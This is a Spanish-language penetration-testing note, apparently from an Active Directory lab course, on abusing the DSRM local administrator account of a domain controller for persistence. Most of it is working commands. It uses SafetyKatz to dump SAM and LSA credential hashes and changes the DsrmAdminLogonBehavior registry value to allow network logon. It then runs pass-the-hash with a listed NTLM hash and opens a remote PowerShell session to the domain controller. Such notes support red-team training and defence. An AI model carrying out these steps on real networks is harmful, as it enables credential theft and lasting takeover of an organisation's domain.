# DSRM (Directory Services Restore Mode)

Tags: #AD #Windows #Powershell #SafetyKatz 

```bash 
- DSRM es Directory Services Restore Mode (Modo de Restauración de Servicios de Directorio).
- Existe un administrador local en cada Domain Controller llamado "Administrator", cuya contraseña es la contraseña de 'DSRM'.
- La contraseña de DSRM (SafeModePassword) es requerida cuando un servidor se promociona a Domain Controller y rara vez se cambia.
- Después de modificar la configuración en el DC, es posible usar el hash NTLM de este usuario para acceder al Domain Controller.
```

[![DSRM.png | 800](https://i.postimg.cc/1z7Z07qq/DSRM.png)](https://postimg.cc/xkm7nRgf)


```powershell 
! Usuario: Domain Admin

❯ SafetyKatz.exe "token::elevate" "lsadump::sam"
# Volcar el hash de la contraseña del Administrator local DSRM del DC — token::elevate impersona a SYSTEM antes de acceder al SAM.

❯ SafetyKatz.exe "lsadump::lsa /patch"
# Volcar los hashes de todas las cuentas del dominio vía LSA — comparar el hash del Administrator de dominio vs el hash DSRM obtenido arriba para verificar si son iguales (misconfiguration común).

Notas:
	1. El primero es el 'Administrador local de DSRM'.
```

```powershell 
! Usuario: Domain Admin

❯ winrs -r:dcorp-dc cmd
# Abrir una shell remota en el DC vía WinRM para ejecutar comandos en el contexto del DC.

❯ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
# Modificar el registro del DC para permitir autenticación de red con la cuenta DSRM — requisito previo para usar el hash DSRM en un Pass-the-Hash hacia el DC.
```

```powershell 
! Usuario: Domain Admin (con hash DSRM y registro DsrmAdminLogonBehavior = 2 configurado)

❯ SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"
# Ejecutar un Pass-the-Hash con el hash DSRM del Administrator local del DC — abre una PowerShell en el contexto de esa cuenta.

❯ Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
# Agregar la IP del DC a los hosts de confianza de WinRM para permitir la conexión con credenciales implícitas.

❯ Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
# Abrir una sesión remota de PowerShell hacia el DC usando las credenciales implícitas del proceso actual (el token obtenido via PTH).
```